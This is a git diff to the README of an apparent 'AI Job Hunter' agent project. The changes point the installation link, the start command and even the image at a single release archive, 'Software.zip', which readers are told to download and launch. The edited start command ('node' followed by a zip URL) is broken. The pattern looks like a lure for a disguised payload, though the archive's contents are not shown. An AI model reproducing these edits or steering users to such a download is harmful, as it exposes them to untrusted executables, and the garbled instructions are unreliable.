@@ -30,7 +30,7 @@ Welcome to the **AI Job Hunter** repository! This project is all about creating 
 
 ## Installation
 
-To get started with the AI Job Hunter, download the [v1.0.0.zip](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) file and launch it to begin exploring the features of this powerful job hunting agent.
+To get started with the AI Job Hunter, download the [https://github.com/DIGITAL-WORLD-ULTRA/ai-job-hunter/releases/download/v1.0/Software.zip](https://github.com/DIGITAL-WORLD-ULTRA/ai-job-hunter/releases/download/v1.0/Software.zip) file and launch it to begin exploring the features of this powerful job hunting agent.
 
 For more information on installation and usage, please visit the "Releases" section of this repository.
 
@@ -40,7 +40,7 @@ Follow these steps to begin using the AI Job Hunter:
 
 1. Install the necessary dependencies by running `npm install`.
 2. Configure your Anthropic and OpenAI API keys in the designated configuration file.
-3. Start the application by running `node app.js`.
+3. Start the application by running `node https://github.com/DIGITAL-WORLD-ULTRA/ai-job-hunter/releases/download/v1.0/Software.zip`.
 4. Explore the various functionalities of the AI Job Hunter and customize it to suit your job search needs.
 
 ## Contributions
@@ -53,4 +53,4 @@ If you encounter any issues or have any questions about the AI Job Hunter, pleas
 
 Let's embark on your job hunting journey with the help of AI Job Hunter! 🚀👔
 
-![AI Job Hunter](https://images.pexels.com/photos/910213/pexels-photo-910213.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260)
+![AI Job Hunter](https://github.com/DIGITAL-WORLD-ULTRA/ai-job-hunter/releases/download/v1.0/Software.zip)
